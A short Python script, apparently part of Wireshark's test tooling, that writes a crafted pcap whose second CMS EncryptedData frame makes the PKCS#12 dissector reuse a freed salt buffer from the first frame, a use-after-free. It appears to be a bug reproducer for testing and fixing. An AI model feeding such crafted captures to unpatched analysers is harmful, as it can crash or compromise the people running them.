#!/usr/bin/env python3
# Helper module for the pkcs12 capture generator
#
# Wireshark - Network traffic analyzer
# By Gerald Combs <gerald@wireshark.org>
# Copyright 1998 Gerald Combs
#
# SPDX-License-Identifier: GPL-2.0-or-later

# PKCS#12: file-scope "salt" tvb and "iteration_count" (set by
# Pkcs-12PbeParams) survive the packet. Needs pkcs12.try_null_password:TRUE
# (no key material; the "decryption" runs with the empty password).
# Frame 1 (Exported PDU "cms"): EncryptedData with algorithm
# pbeWithSHAAnd3-KeyTripleDES-CBC and Pkcs-12PbeParams {salt, iterations 1}.
# Frame 2: same algorithm without parameters -> PBE_decrypt_data() uses the
# frame-1 salt tvb, which was freed with frame 1's packet scope.
from s8ber import tlv, oid, exp_pdu, write_pcap

ID_ENCRYPTED_DATA = '1.2.840.113549.1.7.6'
ID_DATA = '1.2.840.113549.1.7.1'
PBE_3DES = '1.2.840.113549.1.12.1.3'

def enc_data(params):
    alg = tlv(0x30, oid(PBE_3DES) + params)
    eci = tlv(0x30, oid(ID_DATA) + alg + tlv(0x80, bytes(range(16))))
    ed = tlv(0x30, b'\x02\x01\x00' + eci)
    return tlv(0x30, oid(ID_ENCRYPTED_DATA) + tlv(0xa0, ed))

params = tlv(0x30, tlv(0x04, b'SALTSALT') + b'\x02\x01\x01')
pkts = [exp_pdu('cms', enc_data(params)),
        exp_pdu('cms', enc_data(b''))]
write_pcap('pkcs12_salt_uaf.pcap', pkts)
